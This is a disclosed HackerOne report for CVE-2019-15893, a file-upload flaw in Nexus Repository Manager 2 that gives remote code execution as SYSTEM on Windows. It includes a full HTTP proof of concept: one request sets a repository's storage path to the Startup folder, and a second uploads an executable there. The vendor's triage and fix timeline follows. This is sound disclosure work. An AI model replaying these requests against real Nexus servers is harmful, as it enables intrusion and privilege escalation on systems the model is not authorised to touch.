---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/business-logic-errors
  - env/web
  - vuln/code-injection
  - vuln/file-upload
  - impact/rce
  - impact/internal-network
  - trigger/file-upload
substate: "resolved"
weakness: "Business Logic Errors"
enriched: true
body: true
date: 2019-10-30
submitted: 2019-08-28T18:42:12.237Z
bounty_usd: null
votes: 12
cve: "CVE-2019-15893"
program: "[[programs/central-security-project|Central Security Project]]"
reporter: "hland"
source: "https://hackerone.com/reports/683965"
title: "Unrestricted File Upload Leading to Remote Code Execution"
---
# Unrestricted File Upload Leading to Remote Code Execution

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 12 | **Program:** Central Security Project | **Disclosed:** 2019-10-30

- Report: [https://hackerone.com/reports/683965](https://hackerone.com/reports/683965)
- CWE: Business Logic Errors | CVE: CVE-2019-15893
- Submitted: 2019-08-28T18:42:12.237Z

## Report summary

https://support.sonatype.com/hc/en-us/articles/360035055794-CVE-2019-15893-Nexus-Repository-Manager-2-Remote-Code-Execution-2019-09-03

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Description
As an administrator user it is possible to create files and directories in any location on the file system of the server. This can be abused to write files to any sensitive location on the Windows file system because the Nexus process runs with SYSTEM privileges. This can allows an attacker that is able to break into the Nexus Repository Manager to elevate privileges to SYSTEM on the server and use it as pivoting point for lateral movement during an attack.

In the proof-of-concept I upload a PE executable file to the user's Windows Startup Folder, achieving remote code execution the next time the user logs in. In my example simply executing calc.exe. 

The tests were done with an installation of Nexus Repository Manager OSS 2.14.9-01 on Microsoft Windows Server 2016 Datacenter 10.0.14393 N/A Build 1439.

### Additional Details
Unfortunately I was unable to dig up the functions handling these HTTP requests.

## Steps to reproduce:
1. Create a repo and set the "overrideLocalStorageUrl" to a folder two levels below the one you want to write files to.

`POST /nexus/service/local/repositories`

2. Upload a file to a directory of your choice by manipulating the "g", "a" and "v" parameters

`POST /nexus/service/local/artifact/maven/content`


### Proof-Of-Concept

1. Create repository:

```
POST /nexus/service/local/repositories HTTP/1.1
Host: nexus-host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json
X-Nexus-UI: true
Content-Length: 443
Connection: close
Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770

{"data":{"repoType":"hosted","id":"5000","name":"MyTestRepo","writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"exposed":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","downloadRemoteIndexes":false,"checksumPolicy":"IGNORE"}}

HTTP/1.1 201 Created
Date: Wed, 28 Aug 2019 16:58:53 GMT
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Server: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8
Content-Type: application/json; charset=UTF-8
Content-Length: 638
Connection: close

{"data":{"contentResourceURI":"http://<redacted>/nexus/content/repositories/5000","id":"5000","name":"MyTestRepo","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","format":"maven2","repoType":"hosted","exposed":true,"writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","downloadRemoteIndexes":false,"overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","defaultLocalStorageUrl":"file:/C:/Users/myuser/Desktop/nexus-2.14.9-01-bundle/sonatype-work/nexus/storage/5000"}}
```

2. Upload file

```
POST /nexus/service/local/artifact/maven/content HTTP/1.1
Host: nexus-host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------103850373015325909411337083269
Content-Length: 33250
Connection: close
Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770
Upgrade-Insecure-Requests: 1

-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="r"

5000
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="g"

Programs
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="a"

Startup
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="v"

.
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="p"

jar
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="c"


-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="e"

exe
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="file"; filename="calc.exe"
Content-Type: text/html

<insert_content_of_calc.exe>
-----------------------------103850373015325909411337083269--


HTTP/1.1 201 Created
Date: Wed, 28 Aug 2019 17:05:47 GMT
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Server: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8
Content-Type: text/html;charset=UTF-8
Content-Length: 77
Connection: close

{"groupId":"Programs","artifactId":"Startup","version":".","packaging":"jar"}
```

## Patch
There are multiple ways to fix this:

1. Make it the default to run Nexus Repository Manager as a less privileged user. 
2. Restrict the locations on the filesystem that Nexus Repository Manager can write to.

## Additional details

* OS Name:                   Microsoft Windows Server 2016 Datacenter
* OS Version:                10.0.14393 N/A Build 14393

* java version "1.8.0_211"
Java(TM) SE Runtime Environment (build 1.8.0_211-b12)
Java HotSpot(TM) 64-Bit Server VM (build 25.211-b12, mixed mode)

# Wrap up
- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

My reaction when uploading files to any location on the filesystem:
https://66.media.tumblr.com/463873f43d1b6c3ae34ab817fe92e0a2/tumblr_inline_omgbhw31qa1qar3or_500.gif

## Impact

The attacker could run arbitrary code on the server as the SYSTEM user.

## Timeline

- **Report Filed**
- **2019-08-28** @hland: Adding screenshots of attack.
- **2019-08-28** @acazzolla: Hi @hland , thank you for your submission.  We are looking into and confirming the vulnerability now.  We will reply back soon with a confirmation.
- **Report Title Updated**
- **2019-08-30** @acazzolla: @hland Thank you again for your submission.  There are two parts to the attack you describe, the file upload leading to Remote Code Execution and the fact that the Windows service runs as SYSTEM leading to Privilege Escalation.  For the former, we consider this a vulnerability and are working on a fix.  For the latter, this is more a case of not adhering to a best practice and is not a vulnerability on its own.  While running as SYSTEM is not considered a vulnerability, we are still investigating on how we can best address this issue.

Also, how would you like to be credited for the discovery of this vulnerability?
- **2019-08-31** @hland: Hi, thank you for the fast response. I agree with your assessment. I'm thinking that making it easier to run the software without SYSTEM privileges and being very explicit about the inherent dangers of running as SYSTEM would help.

If you could credit me using my name and company that would be greatly appreciated :) 
Name: Christian Håland
Company: Binary Security 
Website: https://www.binarysecurity.no
- **Report Triaged**
- **2019-10-02** @hland: Hi, just checking in to see if there's any status updates on this issue? Thanks in advance. 
/Christian
- **Cve Id Added**
- **2019-10-28** @acazzolla: This vulnerability has been fixed and disclosed at https://support.sonatype.com/hc/en-us/articles/360035055794-CVE-2019-15893-Nexus-Repository-Manager-2-Remote-Code-Execution-2019-09-03
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
